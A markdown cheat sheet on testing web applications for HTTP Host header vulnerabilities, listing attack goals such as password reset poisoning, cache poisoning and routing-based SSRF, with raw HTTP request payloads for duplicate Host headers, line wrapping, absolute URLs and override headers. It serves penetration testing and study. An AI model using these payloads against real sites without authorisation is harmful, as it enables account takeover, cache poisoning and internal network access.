
# Content 
- [How to test for vulnerabilities using the HTTP Host header](#how-to-test-for-vulnerabilities-using-the-http-host-header)
  - [if it still route you for the target endpoint](#1-supply-an-arbitrary-host-header-if-it-still-route-you-for-the-target-endpoint--start-searching-for-functionality-that-use-the-supplied-host-header-you-injected-that-can-be-compromised)
  - [if it rediects you to another host or can not find the host (Invalid Host header) or blocked (Invalid Host header)](#2-supply-an-arbitrary-host-header-if-it-rediects-you-to-another-host-or-can-not-find-the-host-invalid-host-header-or-blocked-invalid-host-header-)
- [Techniques To Use](#techniques-to-use)
  - [injecting a payload via the port](#injecting-a-payload-via-the-port)
  - [advantage of a less-secure subdomain that you have already compromised](#advantage-of-a-less-secure-subdomain-that-you-have-already-compromised)
  - [Inject duplicate Host headers](#inject-duplicate-host-headers)
  - [Supply an absolute URL](#supply-an-absolute-url)
  - [Add line wrapping](#add-line-wrapping)
  - [Inject host override headers](#inject-host-override-headers)

## How to test for vulnerabilities using the HTTP Host header
#### 1) Supply an arbitrary Host header if it still route you for the target endpoint => start searching for functionality that use the supplied host header you injected that can be compromised 
- Password reset poisoning 
- Web cache poisoning
- Exploiting classic server-side vulnerabilities  (Ex:sql,xxe)
#### 2) Supply an arbitrary Host header if it rediects you to another host or can not find the host (Invalid Host header) or blocked (Invalid Host header) : 
- Connection state attacks
```
Connection state attacks: 
For performance reasons, many websites reuse connections for multiple request/response cycles with the same client.
Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection.
This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.

EXAMPLE : you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 
```
- Routing-based SSRF => check if the host header send dns request for your server , check if it rediects you to another host
- Bypassing authentication
- Try to use [below techniques](#techniques-to-use) to get (Password reset poisoning - Web cache poisoning - Exploiting classic server-side vulnerabilities )
  
## Techniques To Use

#### injecting a payload via the port
```http
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```
#### advantage of a less-secure subdomain that you have already compromised
```http
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```
#### Inject duplicate Host headers
```http
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```
#### Supply an absolute URL
```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

#### Add line wrapping
```http
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

#### Inject host override headers
```http
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```
- X-Forwarded-Host
- X-Host
- X-Forwarded-Server
- X-HTTP-Host-Override
- Forwarded

 
